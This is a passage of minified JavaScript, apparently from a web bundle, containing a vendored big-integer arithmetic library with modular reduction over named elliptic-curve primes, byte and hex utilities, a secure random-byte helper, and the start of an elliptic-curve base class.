B=_-P,M=$.words[B]|0,W=y.words[P]|0,K=M*W,q=K&67108863;O=O+(K/67108864|0)|0,q=q+D|0,D=q&67108863,O=O+(q>>>26)|0,v+=O>>>26,O&=67108863}A.words[_]=D,b=O,O=v}return b!==0?A.words[_]=b:A.length--,A.strip()}function m($,y,A){var b=new x;return b.mulp($,y,A)}s.prototype.mulTo=function(y,A){var b,v=this.length+y.length;return this.length===10&&y.length===10?b=g(this,y,A):v<63?b=p(this,y,A):v<1024?b=w(this,y,A):b=m(this,y,A),b};function x($,y){this.x=$,this.y=y}x.prototype.makeRBT=function(y){for(var A=new Array(y),b=s.prototype._countBits(y)-1,v=0;v<y;v++)A[v]=this.revBin(v,b,y);return A},x.prototype.revBin=function(y,A,b){if(y===0||y===b-1)return y;for(var v=0,_=0;_<A;_++)v|=(y&1)<<A-_-1,y>>=1;return v},x.prototype.permute=function(y,A,b,v,_,O){for(var D=0;D<O;D++)v[D]=A[y[D]],_[D]=b[y[D]]},x.prototype.transform=function(y,A,b,v,_,O){this.permute(O,y,A,b,v,_);for(var D=1;D<_;D<<=1)for(var R=D<<1,P=Math.cos(2*Math.PI/R),B=Math.sin(2*Math.PI/R),M=0;M<_;M+=R)for(var W=P,K=B,q=0;q<D;q++){var J=b[M+q],le=v[M+q],ae=b[M+q+D],U=v[M+q+D],G=W*ae-K*U;U=W*U+K*ae,ae=G,b[M+q]=J+ae,v[M+q]=le+U,b[M+q+D]=J-ae,v[M+q+D]=le-U,q!==R&&(G=P*W-B*K,K=P*K+B*W,W=G)}},x.prototype.guessLen13b=function(y,A){var b=Math.max(A,y)|1,v=b&1,_=0;for(b=b/2|0;b;b=b>>>1)_++;return 1<<_+1+v},x.prototype.conjugate=function(y,A,b){if(!(b<=1))for(var v=0;v<b/2;v++){var _=y[v];y[v]=y[b-v-1],y[b-v-1]=_,_=A[v],A[v]=-A[b-v-1],A[b-v-1]=-_}},x.prototype.normalize13b=function(y,A){for(var b=0,v=0;v<A/2;v++){var _=Math.round(y[2*v+1]/A)*8192+Math.round(y[2*v]/A)+b;y[v]=_&67108863,_<67108864?b=0:b=_/67108864|0}return y},x.prototype.convert13b=function(y,A,b,v){for(var _=0,O=0;O<A;O++)_=_+(y[O]|0),b[2*O]=_&8191,_=_>>>13,b[2*O+1]=_&8191,_=_>>>13;for(O=2*A;O<v;++O)b[O]=0;i(_===0),i((_&-8192)===0)},x.prototype.stub=function(y){for(var A=new Array(y),b=0;b<y;b++)A[b]=0;return A},x.prototype.mulp=function(y,A,b){var v=2*this.guessLen13b(y.length,A.length),_=this.makeRBT(v),O=this.stub(v),D=new Array(v),R=new Array(v),P=new Array(v),B=new Array(v),M=new Array(v),W=new Array(v),K=b.words;K.length=v,this.convert13b(y.words,y.length,D,v),this.convert13b(A.words,A.length,B,v),this.transform(D,O,R,P,v,_),this.transform(B,O,M,W,v,_);for(var q=0;q<v;q++){var J=R[q]*M[q]-P[q]*W[q];P[q]=R[q]*W[q]+P[q]*M[q],R[q]=J}return this.conjugate(R,P,v),this.transform(R,P,K,O,v,_),this.conjugate(K,O,v),this.normalize13b(K,v),b.negative=y.negative^A.negative,b.length=y.length+A.length,b.strip()},s.prototype.mul=function(y){var A=new s(null);return A.words=new Array(this.length+y.length),this.mulTo(y,A)},s.prototype.mulf=function(y){var A=new s(null);return A.words=new Array(this.length+y.length),m(this,y,A)},s.prototype.imul=function(y){return this.clone().mulTo(y,this)},s.prototype.imuln=function(y){i(typeof y=="number"),i(y<67108864);for(var A=0,b=0;b<this.length;b++){var v=(this.words[b]|0)*y,_=(v&67108863)+(A&67108863);A>>=26,A+=v/67108864|0,A+=_>>>26,this.words[b]=_&67108863}return A!==0&&(this.words[b]=A,this.length++),this.length=y===0?1:this.length,this},s.prototype.muln=function(y){return this.clone().imuln(y)},s.prototype.sqr=function(){return this.mul(this)},s.prototype.isqr=function(){return this.imul(this.clone())},s.prototype.pow=function(y){var A=f(y);if(A.length===0)return new s(1);for(var b=this,v=0;v<A.length&&A[v]===0;v++,b=b.sqr());if(++v<A.length)for(var _=b.sqr();v<A.length;v++,_=_.sqr())A[v]!==0&&(b=b.mul(_));return b},s.prototype.iushln=function(y){i(typeof y=="number"&&y>=0);var A=y%26,b=(y-A)/26,v=67108863>>>26-A<<26-A,_;if(A!==0){var O=0;for(_=0;_<this.length;_++){var D=this.words[_]&v,R=(this.words[_]|0)-D<<A;this.words[_]=R|O,O=D>>>26-A}O&&(this.words[_]=O,this.length++)}if(b!==0){for(_=this.length-1;_>=0;_--)this.words[_+b]=this.words[_];for(_=0;_<b;_++)this.words[_]=0;this.length+=b}return this.strip()},s.prototype.ishln=function(y){return i(this.negative===0),this.iushln(y)},s.prototype.iushrn=function(y,A,b){i(typeof y=="number"&&y>=0);var v;A?v=(A-A%26)/26:v=0;var _=y%26,O=Math.min((y-_)/26,this.length),D=67108863^67108863>>>_<<_,R=b;if(v-=O,v=Math.max(0,v),R){for(var P=0;P<O;P++)R.words[P]=this.words[P];R.length=O}if(O!==0)if(this.length>O)for(this.length-=O,P=0;P<this.length;P++)this.words[P]=this.words[P+O];else this.words[0]=0,this.length=1;var B=0;for(P=this.length-1;P>=0&&(B!==0||P>=v);P--){var M=this.words[P]|0;this.words[P]=B<<26-_|M>>>_,B=M&D}return R&&B!==0&&(R.words[R.length++]=B),this.length===0&&(this.words[0]=0,this.length=1),this.strip()},s.prototype.ishrn=function(y,A,b){return i(this.negative===0),this.iushrn(y,A,b)},s.prototype.shln=function(y){return this.clone().ishln(y)},s.prototype.ushln=function(y){return this.clone().iushln(y)},s.prototype.shrn=function(y){return this.clone().ishrn(y)},s.prototype.ushrn=function(y){return this.clone().iushrn(y)},s.prototype.testn=function(y){i(typeof y=="number"&&y>=0);var A=y%26,b=(y-A)/26,v=1<<A;if(this.length<=b)return!1;var _=this.words[b];return!!(_&v)},s.prototype.imaskn=function(y){i(typeof y=="number"&&y>=0);var A=y%26,b=(y-A)/26;if(i(this.negative===0,"imaskn works only with positive numbers"),this.length<=b)return this;if(A!==0&&b++,this.length=Math.min(b,this.length),A!==0){var v=67108863^67108863>>>A<<A;this.words[this.length-1]&=v}return this.strip()},s.prototype.maskn=function(y){return this.clone().imaskn(y)},s.prototype.iaddn=function(y){return i(typeof y=="number"),i(y<67108864),y<0?this.isubn(-y):this.negative!==0?this.length===1&&(this.words[0]|0)<y?(this.words[0]=y-(this.words[0]|0),this.negative=0,this):(this.negative=0,this.isubn(y),this.negative=1,this):this._iaddn(y)},s.prototype._iaddn=function(y){this.words[0]+=y;for(var A=0;A<this.length&&this.words[A]>=67108864;A++)this.words[A]-=67108864,A===this.length-1?this.words[A+1]=1:this.words[A+1]++;return this.length=Math.max(this.length,A+1),this},s.prototype.isubn=function(y){if(i(typeof y=="number"),i(y<67108864),y<0)return this.iaddn(-y);if(this.negative!==0)return this.negative=0,this.iaddn(y),this.negative=1,this;if(this.words[0]-=y,this.length===1&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var A=0;A<this.length&&this.words[A]<0;A++)this.words[A]+=67108864,this.words[A+1]-=1;return this.strip()},s.prototype.addn=function(y){return this.clone().iaddn(y)},s.prototype.subn=function(y){return this.clone().isubn(y)},s.prototype.iabs=function(){return this.negative=0,this},s.prototype.abs=function(){return this.clone().iabs()},s.prototype._ishlnsubmul=function(y,A,b){var v=y.length+b,_;this._expand(v);var O,D=0;for(_=0;_<y.length;_++){O=(this.words[_+b]|0)+D;var R=(y.words[_]|0)*A;O-=R&67108863,D=(O>>26)-(R/67108864|0),this.words[_+b]=O&67108863}for(;_<this.length-b;_++)O=(this.words[_+b]|0)+D,D=O>>26,this.words[_+b]=O&67108863;if(D===0)return this.strip();for(i(D===-1),D=0,_=0;_<this.length;_++)O=-(this.words[_]|0)+D,D=O>>26,this.words[_]=O&67108863;return this.negative=1,this.strip()},s.prototype._wordDiv=function(y,A){var b=this.length-y.length,v=this.clone(),_=y,O=_.words[_.length-1]|0,D=this._countBits(O);b=26-D,b!==0&&(_=_.ushln(b),v.iushln(b),O=_.words[_.length-1]|0);var R=v.length-_.length,P;if(A!=="mod"){P=new s(null),P.length=R+1,P.words=new Array(P.length);for(var B=0;B<P.length;B++)P.words[B]=0}var M=v.clone()._ishlnsubmul(_,1,R);M.negative===0&&(v=M,P&&(P.words[R]=1));for(var W=R-1;W>=0;W--){var K=(v.words[_.length+W]|0)*67108864+(v.words[_.length+W-1]|0);for(K=Math.min(K/O|0,67108863),v._ishlnsubmul(_,K,W);v.negative!==0;)K--,v.negative=0,v._ishlnsubmul(_,1,W),v.isZero()||(v.negative^=1);P&&(P.words[W]=K)}return P&&P.strip(),v.strip(),A!=="div"&&b!==0&&v.iushrn(b),{div:P||null,mod:v}},s.prototype.divmod=function(y,A,b){if(i(!y.isZero()),this.isZero())return{div:new s(0),mod:new s(0)};var v,_,O;return this.negative!==0&&y.negative===0?(O=this.neg().divmod(y,A),A!=="mod"&&(v=O.div.neg()),A!=="div"&&(_=O.mod.neg(),b&&_.negative!==0&&_.iadd(y)),{div:v,mod:_}):this.negative===0&&y.negative!==0?(O=this.divmod(y.neg(),A),A!=="mod"&&(v=O.div.neg()),{div:v,mod:O.mod}):(this.negative&y.negative)!==0?(O=this.neg().divmod(y.neg(),A),A!=="div"&&(_=O.mod.neg(),b&&_.negative!==0&&_.isub(y)),{div:O.div,mod:_}):y.length>this.length||this.cmp(y)<0?{div:new s(0),mod:this}:y.length===1?A==="div"?{div:this.divn(y.words[0]),mod:null}:A==="mod"?{div:null,mod:new s(this.modn(y.words[0]))}:{div:this.divn(y.words[0]),mod:new s(this.modn(y.words[0]))}:this._wordDiv(y,A)},s.prototype.div=function(y){return this.divmod(y,"div",!1).div},s.prototype.mod=function(y){return this.divmod(y,"mod",!1).mod},s.prototype.umod=function(y){return this.divmod(y,"mod",!0).mod},s.prototype.divRound=function(y){var A=this.divmod(y);if(A.mod.isZero())return A.div;var b=A.div.negative!==0?A.mod.isub(y):A.mod,v=y.ushrn(1),_=y.andln(1),O=b.cmp(v);return O<0||_===1&&O===0?A.div:A.div.negative!==0?A.div.isubn(1):A.div.iaddn(1)},s.prototype.modn=function(y){i(y<=67108863);for(var A=(1<<26)%y,b=0,v=this.length-1;v>=0;v--)b=(A*b+(this.words[v]|0))%y;return b},s.prototype.idivn=function(y){i(y<=67108863);for(var A=0,b=this.length-1;b>=0;b--){var v=(this.words[b]|0)+A*67108864;this.words[b]=v/y|0,A=v%y}return this.strip()},s.prototype.divn=function(y){return this.clone().idivn(y)},s.prototype.egcd=function(y){i(y.negative===0),i(!y.isZero());var A=this,b=y.clone();A.negative!==0?A=A.umod(y):A=A.clone();for(var v=new s(1),_=new s(0),O=new s(0),D=new s(1),R=0;A.isEven()&&b.isEven();)A.iushrn(1),b.iushrn(1),++R;for(var P=b.clone(),B=A.clone();!A.isZero();){for(var M=0,W=1;(A.words[0]&W)===0&&M<26;++M,W<<=1);if(M>0)for(A.iushrn(M);M-- >0;)(v.isOdd()||_.isOdd())&&(v.iadd(P),_.isub(B)),v.iushrn(1),_.iushrn(1);for(var K=0,q=1;(b.words[0]&q)===0&&K<26;++K,q<<=1);if(K>0)for(b.iushrn(K);K-- >0;)(O.isOdd()||D.isOdd())&&(O.iadd(P),D.isub(B)),O.iushrn(1),D.iushrn(1);A.cmp(b)>=0?(A.isub(b),v.isub(O),_.isub(D)):(b.isub(A),O.isub(v),D.isub(_))}return{a:O,b:D,gcd:b.iushln(R)}},s.prototype._invmp=function(y){i(y.negative===0),i(!y.isZero());var A=this,b=y.clone();A.negative!==0?A=A.umod(y):A=A.clone();for(var v=new s(1),_=new s(0),O=b.clone();A.cmpn(1)>0&&b.cmpn(1)>0;){for(var D=0,R=1;(A.words[0]&R)===0&&D<26;++D,R<<=1);if(D>0)for(A.iushrn(D);D-- >0;)v.isOdd()&&v.iadd(O),v.iushrn(1);for(var P=0,B=1;(b.words[0]&B)===0&&P<26;++P,B<<=1);if(P>0)for(b.iushrn(P);P-- >0;)_.isOdd()&&_.iadd(O),_.iushrn(1);A.cmp(b)>=0?(A.isub(b),v.isub(_)):(b.isub(A),_.isub(v))}var M;return A.cmpn(1)===0?M=v:M=_,M.cmpn(0)<0&&M.iadd(y),M},s.prototype.gcd=function(y){if(this.isZero())return y.abs();if(y.isZero())return this.abs();var A=this.clone(),b=y.clone();A.negative=0,b.negative=0;for(var v=0;A.isEven()&&b.isEven();v++)A.iushrn(1),b.iushrn(1);do{for(;A.isEven();)A.iushrn(1);for(;b.isEven();)b.iushrn(1);var _=A.cmp(b);if(_<0){var O=A;A=b,b=O}else if(_===0||b.cmpn(1)===0)break;A.isub(b)}while(!0);return b.iushln(v)},s.prototype.invm=function(y){return this.egcd(y).a.umod(y)},s.prototype.isEven=function(){return(this.words[0]&1)===0},s.prototype.isOdd=function(){return(this.words[0]&1)===1},s.prototype.andln=function(y){return this.words[0]&y},s.prototype.bincn=function(y){i(typeof y=="number");var A=y%26,b=(y-A)/26,v=1<<A;if(this.length<=b)return this._expand(b+1),this.words[b]|=v,this;for(var _=v,O=b;_!==0&&O<this.length;O++){var D=this.words[O]|0;D+=_,_=D>>>26,D&=67108863,this.words[O]=D}return _!==0&&(this.words[O]=_,this.length++),this},s.prototype.isZero=function(){return this.length===1&&this.words[0]===0},s.prototype.cmpn=function(y){var A=y<0;if(this.negative!==0&&!A)return-1;if(this.negative===0&&A)return 1;this.strip();var b;if(this.length>1)b=1;else{A&&(y=-y),i(y<=67108863,"Number is too big");var v=this.words[0]|0;b=v===y?0:v<y?-1:1}return this.negative!==0?-b|0:b},s.prototype.cmp=function(y){if(this.negative!==0&&y.negative===0)return-1;if(this.negative===0&&y.negative!==0)return 1;var A=this.ucmp(y);return this.negative!==0?-A|0:A},s.prototype.ucmp=function(y){if(this.length>y.length)return 1;if(this.length<y.length)return-1;for(var A=0,b=this.length-1;b>=0;b--){var v=this.words[b]|0,_=y.words[b]|0;if(v!==_){v<_?A=-1:v>_&&(A=1);break}}return A},s.prototype.gtn=function(y){return this.cmpn(y)===1},s.prototype.gt=function(y){return this.cmp(y)===1},s.prototype.gten=function(y){return this.cmpn(y)>=0},s.prototype.gte=function(y){return this.cmp(y)>=0},s.prototype.ltn=function(y){return this.cmpn(y)===-1},s.prototype.lt=function(y){return this.cmp(y)===-1},s.prototype.lten=function(y){return this.cmpn(y)<=0},s.prototype.lte=function(y){return this.cmp(y)<=0},s.prototype.eqn=function(y){return this.cmpn(y)===0},s.prototype.eq=function(y){return this.cmp(y)===0},s.red=function(y){return new N(y)},s.prototype.toRed=function(y){return i(!this.red,"Already a number in reduction context"),i(this.negative===0,"red works only with positives"),y.convertTo(this)._forceRed(y)},s.prototype.fromRed=function(){return i(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},s.prototype._forceRed=function(y){return this.red=y,this},s.prototype.forceRed=function(y){return i(!this.red,"Already a number in reduction context"),this._forceRed(y)},s.prototype.redAdd=function(y){return i(this.red,"redAdd works only with red numbers"),this.red.add(this,y)},s.prototype.redIAdd=function(y){return i(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,y)},s.prototype.redSub=function(y){return i(this.red,"redSub works only with red numbers"),this.red.sub(this,y)},s.prototype.redISub=function(y){return i(this.red,"redISub works only with red numbers"),this.red.isub(this,y)},s.prototype.redShl=function(y){return i(this.red,"redShl works only with red numbers"),this.red.shl(this,y)},s.prototype.redMul=function(y){return i(this.red,"redMul works only with red numbers"),this.red._verify2(this,y),this.red.mul(this,y)},s.prototype.redIMul=function(y){return i(this.red,"redMul works only with red numbers"),this.red._verify2(this,y),this.red.imul(this,y)},s.prototype.redSqr=function(){return i(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},s.prototype.redISqr=function(){return i(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},s.prototype.redSqrt=function(){return i(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},s.prototype.redInvm=function(){return i(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},s.prototype.redNeg=function(){return i(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},s.prototype.redPow=function(y){return i(this.red&&!y.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,y)};var S={k256:null,p224:null,p192:null,p25519:null};function T($,y){this.name=$,this.p=new s(y,16),this.n=this.p.bitLength(),this.k=new s(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}T.prototype._tmp=function(){var y=new s(null);return y.words=new Array(Math.ceil(this.n/13)),y},T.prototype.ireduce=function(y){var A=y,b;do this.split(A,this.tmp),A=this.imulK(A),A=A.iadd(this.tmp),b=A.bitLength();while(b>this.n);var v=b<this.n?-1:A.ucmp(this.p);return v===0?(A.words[0]=0,A.length=1):v>0?A.isub(this.p):A.strip!==void 0?A.strip():A._strip(),A},T.prototype.split=function(y,A){y.iushrn(this.n,0,A)},T.prototype.imulK=function(y){return y.imul(this.k)};function k(){T.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}n(k,T),k.prototype.split=function(y,A){for(var b=4194303,v=Math.min(y.length,9),_=0;_<v;_++)A.words[_]=y.words[_];if(A.length=v,y.length<=9){y.words[0]=0,y.length=1;return}var O=y.words[9];for(A.words[A.length++]=O&b,_=10;_<y.length;_++){var D=y.words[_]|0;y.words[_-10]=(D&b)<<4|O>>>22,O=D}O>>>=22,y.words[_-10]=O,O===0&&y.length>10?y.length-=10:y.length-=9},k.prototype.imulK=function(y){y.words[y.length]=0,y.words[y.length+1]=0,y.length+=2;for(var A=0,b=0;b<y.length;b++){var v=y.words[b]|0;A+=v*977,y.words[b]=A&67108863,A=v*64+(A/67108864|0)}return y.words[y.length-1]===0&&(y.length--,y.words[y.length-1]===0&&y.length--),y};function I(){T.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}n(I,T);function E(){T.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}n(E,T);function C(){T.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}n(C,T),C.prototype.imulK=function(y){for(var A=0,b=0;b<y.length;b++){var v=(y.words[b]|0)*19+A,_=v&67108863;v>>>=26,y.words[b]=_,A=v}return A!==0&&(y.words[y.length++]=A),y},s._prime=function(y){if(S[y])return S[y];var A;if(y==="k256")A=new k;else if(y==="p224")A=new I;else if(y==="p192")A=new E;else if(y==="p25519")A=new C;else throw new Error("Unknown prime "+y);return S[y]=A,A};function N($){if(typeof $=="string"){var y=s._prime($);this.m=y.p,this.prime=y}else i($.gtn(1),"modulus must be greater than 1"),this.m=$,this.prime=null}N.prototype._verify1=function(y){i(y.negative===0,"red works only with positives"),i(y.red,"red works only with red numbers")},N.prototype._verify2=function(y,A){i((y.negative|A.negative)===0,"red works only with positives"),i(y.red&&y.red===A.red,"red works only with red numbers")},N.prototype.imod=function(y){return this.prime?this.prime.ireduce(y)._forceRed(this):y.umod(this.m)._forceRed(this)},N.prototype.neg=function(y){return y.isZero()?y.clone():this.m.sub(y)._forceRed(this)},N.prototype.add=function(y,A){this._verify2(y,A);var b=y.add(A);return b.cmp(this.m)>=0&&b.isub(this.m),b._forceRed(this)},N.prototype.iadd=function(y,A){this._verify2(y,A);var b=y.iadd(A);return b.cmp(this.m)>=0&&b.isub(this.m),b},N.prototype.sub=function(y,A){this._verify2(y,A);var b=y.sub(A);return b.cmpn(0)<0&&b.iadd(this.m),b._forceRed(this)},N.prototype.isub=function(y,A){this._verify2(y,A);var b=y.isub(A);return b.cmpn(0)<0&&b.iadd(this.m),b},N.prototype.shl=function(y,A){return this._verify1(y),this.imod(y.ushln(A))},N.prototype.imul=function(y,A){return this._verify2(y,A),this.imod(y.imul(A))},N.prototype.mul=function(y,A){return this._verify2(y,A),this.imod(y.mul(A))},N.prototype.isqr=function(y){return this.imul(y,y.clone())},N.prototype.sqr=function(y){return this.mul(y,y)},N.prototype.sqrt=function(y){if(y.isZero())return y.clone();var A=this.m.andln(3);if(i(A%2===1),A===3){var b=this.m.add(new s(1)).iushrn(2);return this.pow(y,b)}for(var v=this.m.subn(1),_=0;!v.isZero()&&v.andln(1)===0;)_++,v.iushrn(1);i(!v.isZero());var O=new s(1).toRed(this),D=O.redNeg(),R=this.m.subn(1).iushrn(1),P=this.m.bitLength();for(P=new s(2*P*P).toRed(this);this.pow(P,R).cmp(D)!==0;)P.redIAdd(D);for(var B=this.pow(P,v),M=this.pow(y,v.addn(1).iushrn(1)),W=this.pow(y,v),K=_;W.cmp(O)!==0;){for(var q=W,J=0;q.cmp(O)!==0;J++)q=q.redSqr();i(J<K);var le=this.pow(B,new s(1).iushln(K-J-1));M=M.redMul(le),B=le.redSqr(),W=W.redMul(B),K=J}return M},N.prototype.invm=function(y){var A=y._invmp(this.m);return A.negative!==0?(A.negative=0,this.imod(A).redNeg()):this.imod(A)},N.prototype.pow=function(y,A){if(A.isZero())return new s(1).toRed(this);if(A.cmpn(1)===0)return y.clone();var b=4,v=new Array(1<<b);v[0]=new s(1).toRed(this),v[1]=y;for(var _=2;_<v.length;_++)v[_]=this.mul(v[_-1],y);var O=v[0],D=0,R=0,P=A.bitLength()%26;for(P===0&&(P=26),_=A.length-1;_>=0;_--){for(var B=A.words[_],M=P-1;M>=0;M--){var W=B>>M&1;if(O!==v[0]&&(O=this.sqr(O)),W===0&&D===0){R=0;continue}D<<=1,D|=W,R++,!(R!==b&&(_!==0||M!==0))&&(O=this.mul(O,v[D]),R=0,D=0)}P=26}return O},N.prototype.convertTo=function(y){var A=y.umod(this.m);return A===y?A.clone():A},N.prototype.convertFrom=function(y){var A=y.clone();return A.red=null,A},s.mont=function(y){return new L(y)};function L($){N.call(this,$),this.shift=this.m.bitLength(),this.shift%26!==0&&(this.shift+=26-this.shift%26),this.r=new s(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}n(L,N),L.prototype.convertTo=function(y){return this.imod(y.ushln(this.shift))},L.prototype.convertFrom=function(y){var A=this.imod(y.mul(this.rinv));return A.red=null,A},L.prototype.imul=function(y,A){if(y.isZero()||A.isZero())return y.words[0]=0,y.length=1,y;var b=y.imul(A),v=b.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),_=b.isub(v).iushrn(this.shift),O=_;return _.cmp(this.m)>=0?O=_.isub(this.m):_.cmpn(0)<0&&(O=_.iadd(this.m)),O._forceRed(this)},L.prototype.mul=function(y,A){if(y.isZero()||A.isZero())return new s(0)._forceRed(this);var b=y.mul(A),v=b.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),_=b.isub(v).iushrn(this.shift),O=_;return _.cmp(this.m)>=0?O=_.isub(this.m):_.cmpn(0)<0&&(O=_.iadd(this.m)),O._forceRed(this)},L.prototype.invm=function(y){var A=this.imod(y._invmp(this.m).mul(this.r2));return A._forceRed(this)}})(r,Hve)}(s9)),s9.exports}var _S={},wU;function EQ(){return wU||(wU=1,function(r){var e=r;function t(s,o){if(Array.isArray(s))return s.slice();if(!s)return[];var a=[];if(typeof s!="string"){for(var c=0;c<s.length;c++)a[c]=s[c]|0;return a}if(o==="hex"){s=s.replace(/[^a-z0-9]+/ig,""),s.length%2!==0&&(s="0"+s);for(var c=0;c<s.length;c+=2)a.push(parseInt(s[c]+s[c+1],16))}else for(var c=0;c<s.length;c++){var l=s.charCodeAt(c),u=l>>8,d=l&255;u?a.push(u,d):a.push(d)}return a}e.toArray=t;function i(s){return s.length===1?"0"+s:s}e.zero2=i;function n(s){for(var o="",a=0;a<s.length;a++)o+=i(s[a].toString(16));return o}e.toHex=n,e.encode=function(o,a){return a==="hex"?n(o):o}}(_S)),_S}var bU;function wl(){return bU||(bU=1,function(r){var e=r,t=k0(),i=Kg(),n=EQ();e.assert=i,e.toArray=n.toArray,e.zero2=n.zero2,e.toHex=n.toHex,e.encode=n.encode;function s(u,d,h){var f=new Array(Math.max(u.bitLength(),h)+1),p;for(p=0;p<f.length;p+=1)f[p]=0;var g=1<<d+1,w=u.clone();for(p=0;p<f.length;p++){var m,x=w.andln(g-1);w.isOdd()?(x>(g>>1)-1?m=(g>>1)-x:m=x,w.isubn(m)):m=0,f[p]=m,w.iushrn(1)}return f}e.getNAF=s;function o(u,d){var h=[[],[]];u=u.clone(),d=d.clone();for(var f=0,p=0,g;u.cmpn(-f)>0||d.cmpn(-p)>0;){var w=u.andln(3)+f&3,m=d.andln(3)+p&3;w===3&&(w=-1),m===3&&(m=-1);var x;(w&1)===0?x=0:(g=u.andln(7)+f&7,(g===3||g===5)&&m===2?x=-w:x=w),h[0].push(x);var S;(m&1)===0?S=0:(g=d.andln(7)+p&7,(g===3||g===5)&&w===2?S=-m:S=m),h[1].push(S),2*f===x+1&&(f=1-f),2*p===S+1&&(p=1-p),u.iushrn(1),d.iushrn(1)}return h}e.getJSF=o;function a(u,d,h){var f="_"+d;u.prototype[d]=function(){return this[f]!==void 0?this[f]:this[f]=h.call(this)}}e.cachedProperty=a;function c(u){return typeof u=="string"?e.toArray(u,"hex"):u}e.parseBytes=c;function l(u){return new t(u,"hex","le")}e.intFromLE=l}(ES)),ES}var G6={exports:{}},vU;function _Q(){if(vU)return G6.exports;vU=1;var r;G6.exports=function(n){return r||(r=new e(null)),r.generate(n)};function e(i){this.rand=i}if(G6.exports.Rand=e,e.prototype.generate=function(n){return this._rand(n)},e.prototype._rand=function(n){if(this.rand.getBytes)return this.rand.getBytes(n);for(var s=new Uint8Array(n),o=0;o<s.length;o++)s[o]=this.rand.getByte();return s},typeof self=="object")self.crypto&&self.crypto.getRandomValues?e.prototype._rand=function(n){var s=new Uint8Array(n);return self.crypto.getRandomValues(s),s}:self.msCrypto&&self.msCrypto.getRandomValues?e.prototype._rand=function(n){var s=new Uint8Array(n);return self.msCrypto.getRandomValues(s),s}:typeof window=="object"&&(e.prototype._rand=function(){throw new Error("Not implemented yet")});else try{var t=w3;if(typeof t.randomBytes!="function")throw new Error("Not supported");e.prototype._rand=function(n){return t.randomBytes(n)}}catch{}return G6.exports}var SS={},AS,yU;function oC(){if(yU)return AS;yU=1;var r=k0(),e=wl(),t=e.getNAF,i=e.getJSF,n=e.assert;function s(a,c){this.type=a,this.p=new r(c.p,16),this.red=c.prime?r.red(c.prime):r.mont(this.p),this.zero=new r(0).toRed(this.red),this.one=new r(1).toRed(this.red),this.two=new r(2).toRed(this.red),this.n=c.n&&new r(c.n,16),this.g=c.g&&this.pointFromJSON(c.g,c.gRed),this._wnafT1=new Array(4),this._wnafT2=new Array(4),this._wnafT3=new Array(4),this._wnafT4=new Array(4),this._bitLength=this.n?this.n.bitLength():0;var l=this.n&&this.p.div(this.n);!l||l.cmpn(100)>0?this.redN=null:(this._maxwellTrick=!0,this.redN=this.n.toRed(this.red))}AS=s,s.prototype.point=function(){throw new Error("Not implemented")},s.prototype.validate=function(){throw new Error("Not implemented")},s.prototype._fixedNafMul=function(c,l){n(c.precomputed);var u=c._getDoubles(),d=t(l,1,this._bitLength),h=(1<<u.step+1)-(u.step%2===0?2:1);h/=3;var f=[],p,g;for(p=0;p<d.length;p+=u.step){g=0;for(var w=p+u.step-1;w>=p;w--)g=(g<<1)+d[w];f.push(g)}for(var m=this.jpoint(null,null,null),x=this.jpoint(null,null,null),S=h;S>0;S--){for(p=0;p<f.length;p++)g=f[p],g===S?x=x.mixedAdd(u.points[p]):g===-S&&(x=x.mixedAdd(u.points[p].neg()));m=m.add(x)}return m.toP()},s.prototype._wnafMul=function(c,l){var u=4,d=c._getNAFPoints(u);u=d.wnd;for(var h=d.points,f=t(l,u,this._bitLength),p=this.jpoint(null,null,null),g=f.length-1;g>=0;g--){for(var w=0;g>=0&&f[g]===0;g--)w++;if(g>=0&&w++,p=p.dblp(w),g<0)break;var m=f[g];n(m!==0),c.type==="affine"?m>0?p=p.mixedAdd(h[m-1>>1]):p=p.mixedAdd(h[-m-1>>1].neg()):m>0?p=p.add(h[m-1>>1]):p=p.add(h[-m-1>>1].neg())}return c.type==="affine"?p.toP():p},s.prototype._wnafMulAdd=function(c,l,u,d,h){var f=this._wnafT1,p=this._wnafT2,g=this._wnafT3,w=0,m,x,S;for(m=0;m<d;m++){S=l[m];var T=S._getNAFPoints(c);f[m]=T.wnd,p[m]=T.points}for(m=d-1;m>=1;m-=2){var k=m-1,I=m;if(f[k]!==1||f[I]!==1){g[k]=t(u[k],f[k],this._bitLength),g[I]=t(u[I],f[I],this._bitLength),w=Math.max(g[k].length,w),w=Math.max(g[I].length,w);continue}var E=[l[k],null,null,l[I]];l[k].y.cmp(l[I].y)===0?(E[1]=l[k].add(l[I]),E[2]=l[k].toJ().mixedAdd(l[I].neg())):l[k].y.cmp(l[I].y.redNeg())===0?(E[1]=l[k].toJ().mixedAdd(l[I]),E[2]=l[k].add(l[I].neg())):(E[1]=l[k].toJ().mixedAdd(l[I]),E[2]=l[k].toJ().mixedAdd(l[I].neg()));var C=[-3,-1,-5,-7,0,7,5,1,3],N=i(u[k],u[I]);for(w=Math.max(N[0].length,w),g[k]=new Array(w),g[I]=new Array(w),x=0;x<w;x++){var L=N[0][x]|0,$=N[1][x]|0;g[k][x]=C[(L+1)*3+($+1)],g[I][x]=0,p[k]=E}}var y=this.jpoint(null,null,null),A=this._wnafT4;for(m=w;m>=0;m--){for(var b=0;m>=0;){var 